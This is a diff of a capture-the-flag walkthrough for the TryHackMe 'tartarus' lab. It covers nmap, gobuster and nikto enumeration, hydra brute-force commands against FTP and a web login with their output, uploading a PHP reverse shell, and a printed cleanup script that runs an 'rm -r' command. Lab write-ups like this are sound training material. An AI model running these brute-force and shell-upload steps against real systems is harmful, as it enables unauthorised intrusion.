@@ -3,9 +3,7 @@
 # tartarus CTF
 
 ## nmap
-
 A new room for beginners, of which I am one.... created by [csenox](https://tryhackme.com/p/csenox)
-
 Lets start with basic enumeration:
 ```
 :~/CTF/tryhackme/tartarus$ nmap -A -sC -sV 10.10.77.135
@@ -47,7 +45,6 @@ Nmap done: 1 IP address (1 host up) scanned in 10.46 seconds
 As well as this, I also completed a -p- all ports check, which provided no further information. In the end this gives us, three ports, one: FTP (with anonymous access allowed), one: SSH, and finally one: HTTP. Let's now see what gobuster can provide us with.
 
 ## gobuster
-
 ```
 ~/CTF/tryhackme/tartarus$ gobuster dir -u 10.10.75.241 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 ===============================================================
@@ -71,7 +68,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 Nothing highlighted directly with only the /server-status showing with us having no access.
 
 ## nikto
-
 Let us see what can be picked up here.
 ```
 ~/CTF/tryhackme/tartarus$ nikto -h 10.10.75.241
@@ -103,17 +99,11 @@ I told ------- we should hide our things deep.
 From this we can possibly draw two conclusions, firstly, we have a username and secondly, we have a hidden directory. Lets look at the website as a whole, and in the meantime set off gobuster again on the new folder. No point in not checking, especially with the comment "hide our things deep"
 ```
 gobuster dir -u 10.10.75.241 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
-
 ```
-
 ## website 
-
 Lets quickly start at the front door and check out the HTTP website/page. One thing I have learnt over these last three months of CTF and learning pentesting is that you need to check everything!!
-
 It looks like it is a default Apache Ubuntu holding page.  I read through it but find nothing that jumps out directly.
-
 So what about the /-------?
-
 This gives us two additional files:
 ```
 Index of /-------
@@ -131,13 +121,10 @@ The credentials file contains a long list of approximately 100 passwords.
 ```
 passwords
 ```
-
 While we continue looking, I saved these files and used hydra to try and brute force the FTP and or SSH
 
 ## hydra
-
 Using both files for user and passwords we will attempt to brute force access.
-
 FTP first.
 ```
 ~/CTF/tryhackme/tartarus$ hydra -L users.txt -P passwords.txt ftp://10.10.75.241
@@ -170,12 +157,10 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-15 08:03:
 [STATUS] 30.86 tries/min, 1296 tries in 00:42h, 17 to do in 00:01h, 4 active
 1 of 1 target completed, 0 valid passwords found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-15 08:46:35
-
 ```
 Again nothing. I even tried, as we have a limited number of usernames and passwords, to reverse the lists and check that way. Still nothing.
 
 ## ftp
-
 Let's look at the first port and see where it takes us. First logon with anonymous.
 ```
 ~/CTF/tryhackme/tartarus$ ftp 10.10.218.247
@@ -252,7 +237,6 @@ Another file found. A quick check on the first test file highlighted some text.
 ~/CTF/tryhackme/tartarus$ cat test.txt 
 vsftpd test file
 ```
-
 The second file is more forthcoming.
 ```
 ~/CTF/tryhackme/tartarus$ cat yougotgoodeyes.txt 
@@ -263,7 +247,6 @@ Now we have what looks like a new folder.
 ![](/images/tartarus_login.png)
 
 So we have a login form with a set of usernames and passwords. Lets use hydra again and see what we come up with. In the meantime, I ran a gobuster script for the hidden folder:
-
 ```
 ~/CTF/tryhackme/tartarus$ gobuster dir -u 10.10.218.247/------------ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 ===============================================================
@@ -289,7 +272,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 ```
 OK so some more folders and also the authentication.php that we were aware of.
-
 ```
 ~/CTF/tryhackme/tartarus$ hydra -L users.txt -P passwords.txt 10.10.218.247 http-post-form "/------------/authenticate.php:username=^USER^&password=^PASS^:F=Incorrect*"
 Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -304,9 +286,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-15 11:41:
 Two things that I had issues with here. I tend to copy and paste from my notes using Zim Wiki and so I added the hidden folder at the end of the ip address rather in the form area, but also the initial results I got still gave me wrong passwords (right user) so I just used an asterix to indicate all as in either password and or username.
 
 ## login
-
 Lets see what they can allow us to do.
-
 Looks like we can add some files. Lets see if it will allow a php reverse shell exploit. (I use the one from pentestmonkey)
 
 ![](/images/tartarus_upload.png)
@@ -402,9 +382,7 @@ try:
 	os.system('rm -r /home/cleanup/* ')
 except:
 	sys.exit()
-
 ```
-
 Does this run automatically or when selected. If I can I tend to view crontab earlier than later as it at least gives me an idea of anything that is running.
 ```
 www-data@ubuntu-xenial:/home/------$ cat /etc/crontab
